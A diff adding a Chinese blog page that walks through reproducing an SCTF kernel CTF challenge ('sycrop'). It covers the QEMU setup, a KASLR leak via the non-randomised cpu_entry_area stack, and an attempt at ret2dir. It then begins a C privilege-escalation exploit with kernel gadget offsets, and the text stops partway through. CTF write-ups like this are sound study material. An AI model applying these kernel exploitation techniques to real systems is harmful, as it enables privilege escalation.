@@ -1,0 +1,1390 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+    <head>
+        <meta charset="utf-8">
+        <meta name="viewport" content="width=device-width, initial-scale=1">
+        <meta name="robots" content="noodp" />
+        <title>Sctf内核题目复现 - cnitlrtの博客</title><meta name="Description" content="菜鸡的kernel复现"><meta property="og:title" content="Sctf内核题目复现" />
+<meta property="og:description" content="菜鸡的kernel复现" />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://cnitlrt.github.io/sctf%E5%86%85%E6%A0%B8%E9%A2%98%E7%9B%AE%E5%A4%8D%E7%8E%B0/" /><meta property="og:image" content="https://cnitlrt.github.io/logo.jpg"/><meta property="article:section" content="posts" />
+<meta property="article:published_time" content="2023-06-22T04:18:31+08:00" />
+<meta property="article:modified_time" content="2023-06-22T04:18:31+08:00" /><meta property="og:site_name" content="My cool site" />
+<meta name="twitter:card" content="summary_large_image"/>
+<meta name="twitter:image" content="https://cnitlrt.github.io/logo.jpg"/>
+
+<meta name="twitter:title" content="Sctf内核题目复现"/>
+<meta name="twitter:description" content="菜鸡的kernel复现"/>
+<meta name="application-name" content="LoveIt">
+<meta name="apple-mobile-web-app-title" content="LoveIt"><meta name="theme-color" content="#ffffff"><meta name="msapplication-TileColor" content="#da532c"><link rel="shortcut icon" type="image/x-icon" href="/favicon.ico" />
+        <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
+        <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5"><link rel="manifest" href="/site.webmanifest"><link rel="canonical" href="https://cnitlrt.github.io/sctf%E5%86%85%E6%A0%B8%E9%A2%98%E7%9B%AE%E5%A4%8D%E7%8E%B0/" /><link rel="prev" href="https://cnitlrt.github.io/%E5%AE%89%E5%8D%93%E9%80%86%E5%90%91/" /><link rel="next" href="https://cnitlrt.github.io/qwbswap%E5%A4%8D%E7%8E%B0/" /><link rel="stylesheet" href="/css/style.min.css"><link rel="preload" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.1.1/css/all.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
+        <noscript><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.1.1/css/all.min.css"></noscript><link rel="preload" href="https://cdn.jsdelivr.net/npm/animate.css@4.1.1/animate.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
+        <noscript><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/animate.css@4.1.1/animate.min.css"></noscript><script type="application/ld+json">
+    {
+        "@context": "http://schema.org",
+        "@type": "BlogPosting",
+        "headline": "Sctf内核题目复现",
+        "inLanguage": "zh-CN",
+        "mainEntityOfPage": {
+            "@type": "WebPage",
+            "@id": "https:\/\/cnitlrt.github.io\/sctf%E5%86%85%E6%A0%B8%E9%A2%98%E7%9B%AE%E5%A4%8D%E7%8E%B0\/"
+        },"image": [{
+                            "@type": "ImageObject",
+                            "url": "https:\/\/cnitlrt.github.io\/images\/Apple-Devices-Preview.png",
+                            "width":  3200 ,
+                            "height":  2048 
+                        }],"genre": "posts","keywords": "kernel","wordcount":  3304 ,
+        "url": "https:\/\/cnitlrt.github.io\/sctf%E5%86%85%E6%A0%B8%E9%A2%98%E7%9B%AE%E5%A4%8D%E7%8E%B0\/","datePublished": "2023-06-22T04:18:31+08:00","dateModified": "2023-06-22T04:18:31+08:00","license": "This work is licensed under a Creative Commons Attribution-NonCommercial 4.0 International License.","publisher": {
+            "@type": "Organization",
+            "name": "xxxx","logo": {
+                    "@type": "ImageObject",
+                    "url": "https:\/\/cnitlrt.github.io\/images\/avatar.jpg",
+                    "width":  1080 ,
+                    "height":  1080 
+                }},"author": {
+                "@type": "Person",
+                "name": "cnitlrt"
+            },"description": "菜鸡的kernel复现"
+    }
+    </script></head>
+    <body data-header-desktop="fixed" data-header-mobile="auto"><script type="text/javascript">(window.localStorage && localStorage.getItem('theme') ? localStorage.getItem('theme') === 'dark' : ('auto' === 'auto' ? window.matchMedia('(prefers-color-scheme: dark)').matches : 'auto' === 'dark')) && document.body.setAttribute('theme', 'dark');</script>
+
+        <div id="mask"></div><div class="wrapper"><header class="desktop" id="header-desktop">
+    <div class="header-wrapper">
+        <div class="header-title">
+            <a href="/" title="cnitlrtの博客"><span class="header-title-pre"><i class='far fa-kiss-wink-heart fa-fw'></i></span><span id="id-1" class="typeit"></span></a>
+        </div>
+        <div class="menu">
+            <div class="menu-inner"><a class="menu-item" href="/posts/"> 所有文章 </a><a class="menu-item" href="/tags/"> 标签 </a><a class="menu-item" href="/categories/"> 分类 </a><a class="menu-item" href="/about/"> 关于 </a><a class="menu-item" href="https://github.com/cnitlrt" title="GitHub" rel="noopener noreffer" target="_blank"><i class='fab fa-github fa-fw'></i> Github </a><a class="menu-item" href="/friend/"> 友链 </a><span class="menu-item delimiter"></span><span class="menu-item search" id="search-desktop">
+                        <input type="text" placeholder="搜索文章标题或内容..." id="search-input-desktop">
+                        <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-desktop" title="搜索">
+                            <i class="fas fa-search fa-fw" aria-hidden="true"></i>
+                        </a>
+                        <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-desktop" title="清空">
+                            <i class="fas fa-times-circle fa-fw" aria-hidden="true"></i>
+                        </a>
+                        <span class="search-button search-loading" id="search-loading-desktop">
+                            <i class="fas fa-spinner fa-fw fa-spin" aria-hidden="true"></i>
+                        </span>
+                    </span><a href="javascript:void(0);" class="menu-item theme-switch" title="切换主题">
+                    <i class="fas fa-adjust fa-fw" aria-hidden="true"></i>
+                </a></div>
+        </div>
+    </div>
+</header><header class="mobile" id="header-mobile">
+    <div class="header-container">
+        <div class="header-wrapper">
+            <div class="header-title">
+                <a href="/" title="cnitlrtの博客"><span class="header-title-pre"><i class='far fa-kiss-wink-heart fa-fw'></i></span><span id="id-2" class="typeit"></span></a>
+            </div>
+            <div class="menu-toggle" id="menu-toggle-mobile">
+                <span></span><span></span><span></span>
+            </div>
+        </div>
+        <div class="menu" id="menu-mobile"><div class="search-wrapper">
+                    <div class="search mobile" id="search-mobile">
+                        <input type="text" placeholder="搜索文章标题或内容..." id="search-input-mobile">
+                        <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-mobile" title="搜索">
+                            <i class="fas fa-search fa-fw" aria-hidden="true"></i>
+                        </a>
+                        <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-mobile" title="清空">
+                            <i class="fas fa-times-circle fa-fw" aria-hidden="true"></i>
+                        </a>
+                        <span class="search-button search-loading" id="search-loading-mobile">
+                            <i class="fas fa-spinner fa-fw fa-spin" aria-hidden="true"></i>
+                        </span>
+                    </div>
+                    <a href="javascript:void(0);" class="search-cancel" id="search-cancel-mobile">
+                        取消
+                    </a>
+                </div><a class="menu-item" href="/posts/" title="">所有文章</a><a class="menu-item" href="/tags/" title="">标签</a><a class="menu-item" href="/categories/" title="">分类</a><a class="menu-item" href="/about/" title="">关于</a><a class="menu-item" href="https://github.com/cnitlrt" title="GitHub" rel="noopener noreffer" target="_blank"><i class='fab fa-github fa-fw'></i>Github</a><a class="menu-item" href="/friend/" title="">友链</a><a href="javascript:void(0);" class="menu-item theme-switch" title="切换主题">
+                <i class="fas fa-adjust fa-fw" aria-hidden="true"></i>
+            </a></div>
+    </div>
+</header><div class="search-dropdown desktop">
+        <div id="search-dropdown-desktop"></div>
+    </div>
+    <div class="search-dropdown mobile">
+        <div id="search-dropdown-mobile"></div>
+    </div><main class="main">
+                <div class="container"><div class="toc" id="toc-auto">
+            <h2 class="toc-title">目录</h2>
+            <div class="toc-content" id="toc-content-auto"></div>
+        </div><article class="page single"><h1 class="single-title animate__animated animate__flipInX">Sctf内核题目复现</h1><div class="post-meta">
+            <div class="post-meta-line"><span class="post-author"><a href="/" title="Author" rel="author" class="author"><i class="fas fa-user-circle fa-fw" aria-hidden="true"></i>cnitlrt</a></span>&nbsp;<span class="post-category">收录于 <a href="/categories/kernel/"><i class="far fa-folder fa-fw" aria-hidden="true"></i>kernel</a></span></div>
+            <div class="post-meta-line"><i class="far fa-calendar-alt fa-fw" aria-hidden="true"></i>&nbsp;<time datetime="2023-06-22">2023-06-22</time>&nbsp;<i class="fas fa-pencil-alt fa-fw" aria-hidden="true"></i>&nbsp;约 3304 字&nbsp;
+                <i class="far fa-clock fa-fw" aria-hidden="true"></i>&nbsp;预计阅读 7 分钟&nbsp;</div>
+        </div><div class="details toc" id="toc-static"  data-kept="">
+                <div class="details-summary toc-title">
+                    <span>目录</span>
+                    <span><i class="details-icon fas fa-angle-right" aria-hidden="true"></i></span>
+                </div>
+                <div class="details-content toc-content" id="toc-content-static"><nav id="TableOfContents">
+  <ul>
+    <li><a href="#sycrop">sycrop</a>
+      <ul>
+        <li><a href="#漏洞点">漏洞点</a></li>
+        <li><a href="#分析">分析</a>
+          <ul>
+            <li><a href="#startsh">start.sh</a></li>
+          </ul>
+        </li>
+        <li><a href="#漏洞利用">漏洞利用</a>
+          <ul>
+            <li><a href="#尝试思路1">尝试思路1</a>
+              <ul>
+                <li>
+                  <ul>
+                    <li><a href="#地址leak">地址leak</a></li>
+                    <li><a href="#控制程序流">控制程序流</a></li>
+                  </ul>
+                </li>
+              </ul>
+            </li>
+            <li><a href="#尝试思路2">尝试思路2</a>
+              <ul>
+                <li>
+                  <ul>
+                    <li><a href="#地址leak-1">地址leak</a></li>
+                    <li><a href="#劫持程序流">劫持程序流</a></li>
+                  </ul>
+                </li>
+              </ul>
+            </li>
+          </ul>
+        </li>
+      </ul>
+    </li>
+    <li><a href="#sycrpg">sycrpg</a></li>
+    <li><a href="#moonspray">MoonSpray</a></li>
+  </ul>
+</nav></div>
+            </div><div class="content" id="content"><h1 id="sycrop">sycrop</h1>
+<h2 id="漏洞点">漏洞点</h2>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://tuchuang-1304629987.cos.ap-chengdu.myqcloud.com//image/image-20230622055227030.png"
+        data-srcset="https://tuchuang-1304629987.cos.ap-chengdu.myqcloud.com//image/image-20230622055227030.png, https://tuchuang-1304629987.cos.ap-chengdu.myqcloud.com//image/image-20230622055227030.png 1.5x, https://tuchuang-1304629987.cos.ap-chengdu.myqcloud.com//image/image-20230622055227030.png 2x"
+        data-sizes="auto"
+        alt="https://tuchuang-1304629987.cos.ap-chengdu.myqcloud.com//image/image-20230622055227030.png"
+        title="image-20230622055227030" /></p>
+<p>有任意地址读以及可以控制RSP到任意的地方</p>
+<h2 id="分析">分析</h2>
+<h3 id="startsh">start.sh</h3>
+<p>开了smep smap kaslr</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="cp">#!/bin/sh
+</span></span></span><span class="line"><span class="cl"><span class="cp"></span>qemu-system-x86_64 <span class="se">\
+</span></span></span><span class="line"><span class="cl"><span class="se"></span>    -m 128M <span class="se">\
+</span></span></span><span class="line"><span class="cl"><span class="se"></span>    -kernel ./bzImage <span class="se">\
+</span></span></span><span class="line"><span class="cl"><span class="se"></span>    -initrd ./rootfs.cpio <span class="se">\
+</span></span></span><span class="line"><span class="cl"><span class="se"></span>    -monitor /dev/null <span class="se">\
+</span></span></span><span class="line"><span class="cl"><span class="se"></span>    -append <span class="s2">&#34;root=/dev/ram console=ttyS0 oops=panic panic=1 quiet kaslr&#34;</span> <span class="se">\
+</span></span></span><span class="line"><span class="cl"><span class="se"></span>    -cpu kvm64,+smep,+smap<span class="se">\
+</span></span></span><span class="line"><span class="cl"><span class="se"></span>    -netdev user,id<span class="o">=</span>t0, -device e1000,netdev<span class="o">=</span>t0,id<span class="o">=</span>nic0 <span class="se">\
+</span></span></span><span class="line"><span class="cl"><span class="se"></span>    -nographic <span class="se">\
+</span></span></span><span class="line"><span class="cl"><span class="se"></span>    -no-reboot 
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h2 id="漏洞利用">漏洞利用</h2>
+<h3 id="尝试思路1">尝试思路1</h3>
+<h5 id="地址leak">地址leak</h5>
+<p><a href="https://googleprojectzero.blogspot.com/2022/12/exploiting-CVE-2022-42703-bringing-back-the-stack-attack.html" target="_blank" rel="noopener noreffer ">p0文章</a>里面提到有一处区域在内核中(低版本？)地址是不随机的</p>
+<blockquote>
+<p>在 x86-64 Linux 上，当 CPU 执行某些中断和异常时，它会交换到映射到静态和非随机化虚拟地址的相应堆栈，不同的异常类型使用不同的堆栈。可以在此处找到这些堆栈及其父结构 cpu_entry_area 的简要文档。这些堆栈最常用于从用户态进入内核，但它们也用于内核模式中发生的异常。我们最近看到了 KCTF 条目，<strong>其中攻击者利用非随机化的 cpu_entry_area 堆栈来访问内核可访问内存中已知虚拟地址的数据，即使存在 SMAP 和 KASLR。您还可以使用这些堆栈在已知的内核虚拟地址伪造攻击者控制的数据。这是可行的，因为当由于这些异常之一而发生从用户态到内核模式的切换时，攻击者任务的通用寄存器内容被直接推送到这个堆栈上。当内核本身生成中断堆栈表异常并交换到异常堆栈时也会发生这种情况 - 除了在这种情况下，内核 GPR 被推送。一旦处理了异常，这些压入的寄存器稍后将用于恢复内核状态。在用户态触发异常的情况下，寄存器内容从任务堆栈中恢复。</strong></p>
+</blockquote>
+<p>因此可以做leak</p>
+<blockquote>
+<p>通过硬件断点的方法可以leak出栈地址、Kaslr地址、堆地址中的一个，但是毫无疑问leak Kaslr的地址是必须的</p>
+</blockquote>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://tuchuang-1304629987.cos.ap-chengdu.myqcloud.com//image/image-20230622060152556.png"
+        data-srcset="https://tuchuang-1304629987.cos.ap-chengdu.myqcloud.com//image/image-20230622060152556.png, https://tuchuang-1304629987.cos.ap-chengdu.myqcloud.com//image/image-20230622060152556.png 1.5x, https://tuchuang-1304629987.cos.ap-chengdu.myqcloud.com//image/image-20230622060152556.png 2x"
+        data-sizes="auto"
+        alt="https://tuchuang-1304629987.cos.ap-chengdu.myqcloud.com//image/image-20230622060152556.png"
+        title="image-20230622060152556" /></p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://tuchuang-1304629987.cos.ap-chengdu.myqcloud.com//image/image-20230622060230634.png"
+        data-srcset="https://tuchuang-1304629987.cos.ap-chengdu.myqcloud.com//image/image-20230622060230634.png, https://tuchuang-1304629987.cos.ap-chengdu.myqcloud.com//image/image-20230622060230634.png 1.5x, https://tuchuang-1304629987.cos.ap-chengdu.myqcloud.com//image/image-20230622060230634.png 2x"
+        data-sizes="auto"
+        alt="https://tuchuang-1304629987.cos.ap-chengdu.myqcloud.com//image/image-20230622060230634.png"
+        title="image-20230622060230634" /></p>
+<h5 id="控制程序流">控制程序流</h5>
+<p>由于我们只能控制rsp,所以我们必须考虑将栈迁移到一直的地址并且其中的内容是可控的，一开始没有注意到p0文章中的<strong>攻击者任务的通用寄存器内容被直接推送到这个堆栈上。当内核本身生成中断堆栈表异常并交换到异常堆栈时也会发生这种情况</strong>,因此我便尝试了<a href="https://ctf-wiki.org/pwn/linux/kernel-mode/exploitation/rop/ret2dir/" target="_blank" rel="noopener noreffer ">ret2dir</a>的方法，关闭了Kaslr由于physmap的值是固定的，因此可以打通，如果是开了Kaslr则需要爆破，爆破位数太搞了，所以就放弃了</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">  1
+</span><span class="lnt">  2
+</span><span class="lnt">  3
+</span><span class="lnt">  4
+</span><span class="lnt">  5
+</span><span class="lnt">  6
+</span><span class="lnt">  7
+</span><span class="lnt">  8
+</span><span class="lnt">  9
+</span><span class="lnt"> 10
+</span><span class="lnt"> 11
+</span><span class="lnt"> 12
+</span><span class="lnt"> 13
+</span><span class="lnt"> 14
+</span><span class="lnt"> 15
+</span><span class="lnt"> 16
+</span><span class="lnt"> 17
+</span><span class="lnt"> 18
+</span><span class="lnt"> 19
+</span><span class="lnt"> 20
+</span><span class="lnt"> 21
+</span><span class="lnt"> 22
+</span><span class="lnt"> 23
+</span><span class="lnt"> 24
+</span><span class="lnt"> 25
+</span><span class="lnt"> 26
+</span><span class="lnt"> 27
+</span><span class="lnt"> 28
+</span><span class="lnt"> 29
+</span><span class="lnt"> 30
+</span><span class="lnt"> 31
+</span><span class="lnt"> 32
+</span><span class="lnt"> 33
+</span><span class="lnt"> 34
+</span><span class="lnt"> 35
+</span><span class="lnt"> 36
+</span><span class="lnt"> 37
+</span><span class="lnt"> 38
+</span><span class="lnt"> 39
+</span><span class="lnt"> 40
+</span><span class="lnt"> 41
+</span><span class="lnt"> 42
+</span><span class="lnt"> 43
+</span><span class="lnt"> 44
+</span><span class="lnt"> 45
+</span><span class="lnt"> 46
+</span><span class="lnt"> 47
+</span><span class="lnt"> 48
+</span><span class="lnt"> 49
+</span><span class="lnt"> 50
+</span><span class="lnt"> 51
+</span><span class="lnt"> 52
+</span><span class="lnt"> 53
+</span><span class="lnt"> 54
+</span><span class="lnt"> 55
+</span><span class="lnt"> 56
+</span><span class="lnt"> 57
+</span><span class="lnt"> 58
+</span><span class="lnt"> 59
+</span><span class="lnt"> 60
+</span><span class="lnt"> 61
+</span><span class="lnt"> 62
+</span><span class="lnt"> 63
+</span><span class="lnt"> 64
+</span><span class="lnt"> 65
+</span><span class="lnt"> 66
+</span><span class="lnt"> 67
+</span><span class="lnt"> 68
+</span><span class="lnt"> 69
+</span><span class="lnt"> 70
+</span><span class="lnt"> 71
+</span><span class="lnt"> 72
+</span><span class="lnt"> 73
+</span><span class="lnt"> 74
+</span><span class="lnt"> 75
+</span><span class="lnt"> 76
+</span><span class="lnt"> 77
+</span><span class="lnt"> 78
+</span><span class="lnt"> 79
+</span><span class="lnt"> 80
+</span><span class="lnt"> 81
+</span><span class="lnt"> 82
+</span><span class="lnt"> 83
+</span><span class="lnt"> 84
+</span><span class="lnt"> 85
+</span><span class="lnt"> 86
+</span><span class="lnt"> 87
+</span><span class="lnt"> 88
+</span><span class="lnt"> 89
+</span><span class="lnt"> 90
+</span><span class="lnt"> 91
+</span><span class="lnt"> 92
+</span><span class="lnt"> 93
+</span><span class="lnt"> 94
+</span><span class="lnt"> 95
+</span><span class="lnt"> 96
+</span><span class="lnt"> 97
+</span><span class="lnt"> 98
+</span><span class="lnt"> 99
+</span><span class="lnt">100
+</span><span class="lnt">101
+</span><span class="lnt">102
+</span><span class="lnt">103
+</span><span class="lnt">104
+</span><span class="lnt">105
+</span><span class="lnt">106
+</span><span class="lnt">107
+</span><span class="lnt">108
+</span><span class="lnt">109
+</span><span class="lnt">110
+</span><span class="lnt">111
+</span><span class="lnt">112
+</span><span class="lnt">113
+</span><span class="lnt">114
+</span><span class="lnt">115
+</span><span class="lnt">116
+</span><span class="lnt">117
+</span><span class="lnt">118
+</span><span class="lnt">119
+</span><span class="lnt">120
+</span><span class="lnt">121
+</span><span class="lnt">122
+</span><span class="lnt">123
+</span><span class="lnt">124
+</span><span class="lnt">125
+</span><span class="lnt">126
+</span><span class="lnt">127
+</span><span class="lnt">128
+</span><span class="lnt">129
+</span><span class="lnt">130
+</span><span class="lnt">131
+</span><span class="lnt">132
+</span><span class="lnt">133
+</span><span class="lnt">134
+</span><span class="lnt">135
+</span><span class="lnt">136
+</span><span class="lnt">137
+</span><span class="lnt">138
+</span><span class="lnt">139
+</span><span class="lnt">140
+</span><span class="lnt">141
+</span><span class="lnt">142
+</span><span class="lnt">143
+</span><span class="lnt">144
+</span><span class="lnt">145
+</span><span class="lnt">146
+</span><span class="lnt">147
+</span><span class="lnt">148
+</span><span class="lnt">149
+</span><span class="lnt">150
+</span><span class="lnt">151
+</span><span class="lnt">152
+</span><span class="lnt">153
+</span><span class="lnt">154
+</span><span class="lnt">155
+</span><span class="lnt">156
+</span><span class="lnt">157
+</span><span class="lnt">158
+</span><span class="lnt">159
+</span><span class="lnt">160
+</span><span class="lnt">161
+</span><span class="lnt">162
+</span><span class="lnt">163
+</span><span class="lnt">164
+</span><span class="lnt">165
+</span><span class="lnt">166
+</span><span class="lnt">167
+</span><span class="lnt">168
+</span><span class="lnt">169
+</span><span class="lnt">170
+</span><span class="lnt">171
+</span><span class="lnt">172
+</span><span class="lnt">173
+</span><span class="lnt">174
+</span><span class="lnt">175
+</span><span class="lnt">176
+</span><span class="lnt">177
+</span><span class="lnt">178
+</span><span class="lnt">179
+</span><span class="lnt">180
+</span><span class="lnt">181
+</span><span class="lnt">182
+</span><span class="lnt">183
+</span><span class="lnt">184
+</span><span class="lnt">185
+</span><span class="lnt">186
+</span><span class="lnt">187
+</span><span class="lnt">188
+</span><span class="lnt">189
+</span><span class="lnt">190
+</span><span class="lnt">191
+</span><span class="lnt">192
+</span><span class="lnt">193
+</span><span class="lnt">194
+</span><span class="lnt">195
+</span><span class="lnt">196
+</span><span class="lnt">197
+</span><span class="lnt">198
+</span><span class="lnt">199
+</span><span class="lnt">200
+</span><span class="lnt">201
+</span><span class="lnt">202
+</span><span class="lnt">203
+</span><span class="lnt">204
+</span><span class="lnt">205
+</span><span class="lnt">206
+</span><span class="lnt">207
+</span><span class="lnt">208
+</span><span class="lnt">209
+</span><span class="lnt">210
+</span><span class="lnt">211
+</span><span class="lnt">212
+</span><span class="lnt">213
+</span><span class="lnt">214
+</span><span class="lnt">215
+</span><span class="lnt">216
+</span><span class="lnt">217
+</span><span class="lnt">218
+</span><span class="lnt">219
+</span><span class="lnt">220
+</span><span class="lnt">221
+</span><span class="lnt">222
+</span><span class="lnt">223
+</span><span class="lnt">224
+</span><span class="lnt">225
+</span><span class="lnt">226
+</span><span class="lnt">227
+</span><span class="lnt">228
+</span><span class="lnt">229
+</span><span class="lnt">230
+</span><span class="lnt">231
+</span><span class="lnt">232
+</span><span class="lnt">233
+</span><span class="lnt">234
+</span><span class="lnt">235
+</span><span class="lnt">236
+</span><span class="lnt">237
+</span><span class="lnt">238
+</span><span class="lnt">239
+</span><span class="lnt">240
+</span><span class="lnt">241
+</span><span class="lnt">242
+</span><span class="lnt">243
+</span><span class="lnt">244
+</span><span class="lnt">245
+</span><span class="lnt">246
+</span><span class="lnt">247
+</span><span class="lnt">248
+</span><span class="lnt">249
+</span><span class="lnt">250
+</span><span class="lnt">251
+</span><span class="lnt">252
+</span><span class="lnt">253
+</span><span class="lnt">254
+</span><span class="lnt">255
+</span><span class="lnt">256
+</span><span class="lnt">257
+</span><span class="lnt">258
+</span><span class="lnt">259
+</span><span class="lnt">260
+</span><span class="lnt">261
+</span><span class="lnt">262
+</span><span class="lnt">263
+</span><span class="lnt">264
+</span><span class="lnt">265
+</span><span class="lnt">266
+</span><span class="lnt">267
+</span><span class="lnt">268
+</span><span class="lnt">269
+</span><span class="lnt">270
+</span><span class="lnt">271
+</span><span class="lnt">272
+</span><span class="lnt">273
+</span><span class="lnt">274
+</span><span class="lnt">275
+</span><span class="lnt">276
+</span><span class="lnt">277
+</span><span class="lnt">278
+</span><span class="lnt">279
+</span><span class="lnt">280
+</span><span class="lnt">281
+</span><span class="lnt">282
+</span><span class="lnt">283
+</span><span class="lnt">284
+</span><span class="lnt">285
+</span><span class="lnt">286
+</span><span class="lnt">287
+</span><span class="lnt">288
+</span><span class="lnt">289
+</span><span class="lnt">290
+</span><span class="lnt">291
+</span><span class="lnt">292
+</span><span class="lnt">293
+</span><span class="lnt">294
+</span><span class="lnt">295
+</span><span class="lnt">296
+</span><span class="lnt">297
+</span><span class="lnt">298
+</span><span class="lnt">299
+</span><span class="lnt">300
+</span><span class="lnt">301
+</span><span class="lnt">302
+</span><span class="lnt">303
+</span><span class="lnt">304
+</span><span class="lnt">305
+</span><span class="lnt">306
+</span><span class="lnt">307
+</span><span class="lnt">308
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="c1">// =-=-=-=-=-=-=-= INCLUDE =-=-=-=-=-=-=-=
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="cp">#define _GNU_SOURCE
+</span></span></span><span class="line"><span class="cl"><span class="cp"></span>
+</span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;assert.h&gt;</span><span class="cp">
+</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;fcntl.h&gt;</span><span class="cp">
+</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;poll.h&gt;</span><span class="cp">
+</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;sched.h&gt;</span><span class="cp">
+</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;signal.h&gt;</span><span class="cp">
+</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;stdbool.h&gt;</span><span class="cp">
+</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;stdint.h&gt;</span><span class="cp">
+</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp">
+</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;stdlib.h&gt;</span><span class="cp">
+</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;string.h&gt;</span><span class="cp">
+</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;sys/ioctl.h&gt;</span><span class="cp">
+</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;sys/mman.h&gt;</span><span class="cp">
+</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;sys/prctl.h&gt;</span><span class="cp">
+</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;sys/ptrace.h&gt;</span><span class="cp">
+</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;pthread.h&gt;</span><span class="cp">
+</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;sys/stat.h&gt;</span><span class="cp">
+</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;sys/types.h&gt;</span><span class="cp">
+</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;sys/user.h&gt;</span><span class="cp">
+</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;sys/utsname.h&gt;</span><span class="cp">
+</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;sys/wait.h&gt;</span><span class="cp">
+</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;syscall.h&gt;</span><span class="cp">
+</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;unistd.h&gt;</span><span class="cp">
+</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&#34;banzi.h&#34;</span><span class="cp">
+</span></span></span><span class="line"><span class="cl"><span class="cp"></span>
+</span></span><span class="line"><span class="cl"><span class="c1">// =-=-=-=-=-=-=-= DEFINE =-=-=-=-=-=-=-=
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="cp">#define GLOBAL_MMAP_ADDR ((char *)(0x12340000))
+</span></span></span><span class="line"><span class="cl"><span class="cp">#define GLOBAL_MMAP_LENGTH (0x2000)
+</span></span></span><span class="line"><span class="cl"><span class="cp"></span>
+</span></span><span class="line"><span class="cl"><span class="kt">char</span> <span class="o">*</span><span class="n">buf_buf</span> <span class="o">=</span> <span class="p">(</span><span class="kt">char</span><span class="o">*</span><span class="p">)</span><span class="n">GLOBAL_MMAP_ADDR</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">user_cs</span><span class="p">,</span> <span class="n">user_ss</span><span class="p">,</span> <span class="n">user_eflags</span><span class="p">,</span> <span class="n">user_sp</span><span class="p">,</span> <span class="n">user_ip</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="kt">size_t</span>  <span class="n">commit_creds</span> <span class="o">=</span> <span class="mh">0x0bb5b0</span> <span class="o">+</span> <span class="mi">0</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="kt">size_t</span>  <span class="n">init_cred</span> <span class="o">=</span> <span class="mh">0x1a4cbf8</span> <span class="o">+</span> <span class="mi">0</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="kt">size_t</span>  <span class="n">pop_rdi_ret</span> <span class="o">=</span> <span class="mh">0x002c9d</span> <span class="o">+</span> <span class="mi">0</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="kt">size_t</span>  <span class="n">pop_rax_ret</span> <span class="o">=</span> <span class="mh">0x04e368</span> <span class="o">+</span> <span class="mi">0</span><span class="p">;</span>
